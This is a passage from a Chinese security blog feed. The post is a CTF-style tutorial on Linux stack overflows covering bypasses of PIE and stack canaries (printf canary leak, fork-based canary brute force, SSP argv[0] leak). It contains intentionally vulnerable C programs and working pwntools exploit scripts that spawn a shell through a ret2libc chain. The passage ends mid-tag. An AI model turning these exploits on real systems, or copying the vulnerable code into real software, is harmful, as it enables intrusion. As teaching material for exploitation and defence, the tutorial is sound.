class="line">http://abcdxyzk.github.io/blog/2015/08/05/kernel-mm-malloc/</span><br><span class="line">https://www.cnblogs.com/unr4v31/p/14446412.html</span><br><span class="line">https://ctf-wiki.org/pwn/linux/glibc-heap/heap_structure/#fast-bin</span><br><span class="line">https://www.bilibili.com/video/BV1N441147K2?p=18</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux栈溢出总结（0x03）</title>
    <link href="https://www.ascotbe.com/2021/03/26/StackOverflow_Linux_0x03/"/>
    <id>https://www.ascotbe.com/2021/03/26/StackOverflow_Linux_0x03/</id>
    <published>2021-03-26T10:45:42.000Z</published>
    <updated>2022-01-10T03:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>上篇文章真的就是一改就花了一个月时间，然后发现篇幅有点太长了分割一下，感觉这篇也需要好久</p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/27.png" alt="image-20210326103216832" style="zoom:50%;" /><blockquote><p>记录</p></blockquote><p>几个未填坑的点</p><ul><li>如何计算出TLS的offset大小（EXP抄的，我也懵</li><li>SSP题目中，为什么当可执行文件足够小的时候，他的不同区段可能会被多次映射？</li></ul><blockquote><h2 id="绕过PIE保护"><a href="#绕过PIE保护" class="headerlink" title="绕过PIE保护"></a>绕过PIE保护</h2></blockquote><p>测试代码（题目泄露地址）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">vuln_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line"><span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;main);</span><br><span class="line"><span class="built_in">vuln_func</span>();</span><br><span class="line"><span class="built_in">write</span>(STDOUT_FILENO, <span class="string">&quot;Hello world!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译产生修改为<code>-pie -fpie</code>，与<code>-pie -fno-pie</code>不同的是，它不再对程序原始字节码做修改，而是使用了一类  <strong>__x86.get_pc.thunk</strong>函数，通过PC指针来做定位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z noexecstack -pie -fpie test.c -o test2.out</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/28.png" alt="image-20210326152720436"></p><p>可以看到call函数的地址变成了上述我们所说的，由于<strong>__x86.get_pc.thunk</strong>的作用将下一条指令的地址赋值给EBX寄存器，然后通过加上一个偏移得到当前进程的GOT表的地址，并以此作为后续的基地址。</p><div class="note info modern"><p>PIE技术的缺陷：我们知道，内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。</p></div><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/29.png" alt="image-20210326153042242"></p><p>知道了这些我们就可以编写EXP了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./test2.out&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test2.out&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(io.recvline(), <span class="number">16</span>)<span class="comment">#获取printf输出的main函数地址</span></span><br><span class="line">start_addr = main_addr - elf.sym[<span class="string">&#x27;main&#x27;</span>]<span class="comment">#计算相对偏移</span></span><br><span class="line">vuln_func_addr = start_addr + elf.sym[<span class="string">&#x27;vuln_func&#x27;</span>]</span><br><span class="line">write_plt = start_addr + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = start_addr + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write plt: &quot;</span> + <span class="built_in">hex</span>(write_plt))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write got: &quot;</span> + <span class="built_in">hex</span>(write_got))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]main addr: &quot;</span> + <span class="built_in">hex</span>(main_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]start addr: &quot;</span> + <span class="built_in">hex</span>(start_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]vuln func addr: &quot;</span> + <span class="built_in">hex</span>(vuln_func_addr))</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload1 to leak libc...&quot;</span>)</span><br><span class="line">ebx = start_addr + <span class="number">0x2000</span><span class="comment"># 通过相对偏移加上PIE缺陷所得的地址获取到GOT表的地址</span></span><br><span class="line"><span class="comment">#这边的0X2000的值请看《ctf竞赛权威指南（PWN篇）》这本书的PIE解释</span></span><br><span class="line"><span class="comment">#0x699+0x1967=0x2000，为什么这样加呢？请看上面的PIE技术的缺陷，以及上面那张截图圈起来的两个值</span></span><br><span class="line">payload1 = (<span class="string">&quot;A&quot;</span>*<span class="number">132</span>).encode() + p32(ebx) + <span class="string">b&quot;AAAA&quot;</span> + p32(write_plt) + p32(vuln_func_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)<span class="comment">#根据__x86.get_pc.thunk的特性拼接地址，该特性多了一步call操作</span></span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv())</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak write addr: &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_addr=write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak libc addr: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr+ libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = (<span class="string">&quot;B&quot;</span> * <span class="number">140</span>).encode() + p32(system_addr) + p32(vuln_func_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/30.png" alt="image-20210326163537561"></p><blockquote><h2 id="绕过CANNARY保护"><a href="#绕过CANNARY保护" class="headerlink" title="绕过CANNARY保护"></a>绕过CANNARY保护</h2></blockquote><p>保护原理就是在ebp的低地址添加一个随即值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">High           +-----------------+</span><br><span class="line"> |             |      args       |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> |             | return address  |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> |     ebp =&gt;  |       ebp       |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> |    ebp-4 =&gt; |   canary value  |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> V             |     局部变量     |</span><br><span class="line">Low            +-----------------+</span><br></pre></td></tr></table></figure><hr><h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p><h4 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h4><p>存在漏洞的示例源代码如下，编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getshell</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stderr, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello Hacker!&quot;</span>);</span><br><span class="line">    <span class="built_in">vuln</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -no-pie test.c -o test3</span></span><br></pre></td></tr></table></figure><p>这题只需要利用print函数的信息泄露获取到canary值的地址即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./test3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">get_shell_func_addr = elf.sym[<span class="string">&#x27;getshell&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]get shell func addr: &quot;</span> + <span class="built_in">hex</span>(get_shell_func_addr))</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="comment">#利用两次for循环来获取canary_value的值</span></span><br><span class="line"><span class="comment">#第一次利用溢出获取返回的值，由于canary的保护我们不会覆盖到ebp，程序可以进行运行</span></span><br><span class="line">payload1 = (<span class="string">&quot;A&quot;</span>*<span class="number">100</span>).encode()</span><br><span class="line">io.sendline(payload1)<span class="comment">#必须使用带&#x27;\n&#x27;的值进行poc结尾，也就是模拟回车键</span></span><br><span class="line"><span class="comment">#输出带有payload1和canary混合的值，用recvuntil来接收处理</span></span><br><span class="line">recvuntil_value=io.recvuntil(payload1)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">b&quot;[*]recvuntil value: &quot;</span> + recvuntil_value)</span><br><span class="line">canary_value = u32(io.recv(<span class="number">4</span>))-<span class="number">0xa</span><span class="comment">#0xa是\n的十六进制值，ASCII表对应</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]canary value: &quot;</span> + <span class="built_in">hex</span>(canary_value))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]canary value add 0xa: &quot;</span> + <span class="built_in">hex</span>(canary_value+<span class="number">0xa</span>))</span><br><span class="line">payload2 = (<span class="string">&quot;A&quot;</span>*<span class="number">100</span>).encode()+p32(canary_value)+(<span class="string">&quot;A&quot;</span>*<span class="number">12</span>).encode()+p32(get_shell_func_addr)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="爆破Canary值"><a href="#爆破Canary值" class="headerlink" title="爆破Canary值"></a>爆破Canary值</h3><p>每次进程重启后的canary不同，且同一个进程中的每个线程的canary也不同。但是如果程序通过fork函数开启子进程交互的话，fork函数会直接拷贝父进程的内存，因此每次创建的子进程的canary是相同的。我们可以利用这样的特点，逐个字节将canary爆破出来。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getflag</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;get flag error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="built_in">fgets</span>(flag, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stderr, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, buffer, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line"><span class="built_in">fun</span>();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;recv sucess&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">wait</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc -m32 -no-pie test.c -o test4</span></span><br><span class="line"><span class="comment">//echo &quot;hello wrod by ascotbe&quot; &gt; flag</span></span><br></pre></td></tr></table></figure><p>可以看到源码里面溢出点是100个字符，并且运行程序如果一直按回车会启动N个进程</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/31.png" alt="image-20210401114355036"></p><p>因为canary的 最后的一个字节总是<strong>0x00</strong>（为了截断数据，小端排序），所以只需要爆破剩下的三个字节就可以了，每次尝试一个字节，如果程序顺利执行得到结果<code>welcome\n</code>，否则程序崩溃，通过穷举就能爆破处正确的canary值。64位的话爆破7位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./test4&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test4&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">get_flag_func_addr = elf.sym[<span class="string">&#x27;getflag&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">test=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        io.send((<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>).encode()+ canary + <span class="built_in">bytes</span>([i]))<span class="comment">#int转换成bytes用这个方法，可以直接转换为16进制的</span></span><br><span class="line">        a = io.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;recv&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += <span class="built_in">bytes</span>([i])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">b&quot;[*] Blasting out byte :&quot;</span>+canary)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&quot;[*] canary is :&quot;</span>+canary)</span><br><span class="line">payload=(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>).encode() + canary+ (<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>).encode() + p32(get_flag_func_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">flag = io.recv()</span><br><span class="line">io.close()</span><br><span class="line">log.success(<span class="string">&quot;flag is:&quot;</span> + flag.decode())</span><br></pre></td></tr></table></figure><p><del>弱类型语言类型转换真的有点恶心</del></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/32.png" alt="image-20210401173411704"></p><h3 id="SSP（Stack-Smashing-Protector-）"><a href="#SSP（Stack-Smashing-Protector-）" class="headerlink" title="SSP（Stack Smashing Protector ）"></a>SSP（Stack Smashing Protector ）</h3><p>利用原理是Canary值被修改然后函数不能正常执行，会<code>call __stack_chk_fail</code>打印**argv[0]**这个指针指向的字符串，默认是程序的名字。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们把它覆盖为flag的地址时，它就会把flag给打印出来，注意不要用原来flag的地址覆盖，因为原来存储flag的地址会被overwrite，但是由于ELF的映射方式，此flag会被映射两次，另一个地方的flag的内容不会变，原因是<code>__stack_chk_fail</code>会调用<strong>libc_message</strong></p><p><a href="https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229">题目地址</a>    <a href="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/smashes">备用地址</a></p><p>我们使用IDA查看一下代码，可以发现溢出点在下面这段代码中的<code>_IO_getc</code>函数中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = _IO_getc(stdin);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  byte_600D20[v0++] = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双击<code>byte_600D20</code>可以看到这样的画面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000600D20 ; char byte_600D20[]</span><br><span class="line">.data:0000000000600D20 byte_600D20     db 50h                  ; DATA XREF: sub_4007E0+6E↑w</span><br><span class="line">.data:0000000000600D21 aCtfHereSTheFla db &#x27;CTF&#123;Here&#x27;,27h,&#x27;s the flag on server&#125;&#x27;,0</span><br><span class="line">.data:0000000000600D21 _data           ends</span><br></pre></td></tr></table></figure><p>由此可知，服务器端中的 flag 应该也在这个位置上。接下来我们需要下个断点来进入main函数，但是由于程序经过了strip处理，没有debug信息，所以我们需要下断点到<code>__libc_start_main</code>函数才能看到，可以看到RDI的值才是main函数的真正入口</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/33.png" alt="image-20210402134315830"></p><p><strong>0x7fffffffe269</strong>指向程序名，其自然就是argv[0]，所以我们修改的内容就是这个地址。<br>同时<strong>0x7fffffffded8</strong>处保留着该地址，所以我们真正需要的地址是<strong>0x7fffffffded8</strong></p><p>接着我们需要找到栈顶到这个argv[0]的偏移，从而方便我们计算出需要填充的字符个数</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/34.png" alt="image-20210403203337757"></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/35.png" alt="image-20210406215300344"></p><p>从图中我们可以知道，我们只需要把断点下到<code>_IO_gets</code>这个函数之前就能获取到argv[0]的偏移，接着可以看到</p><p><img src= 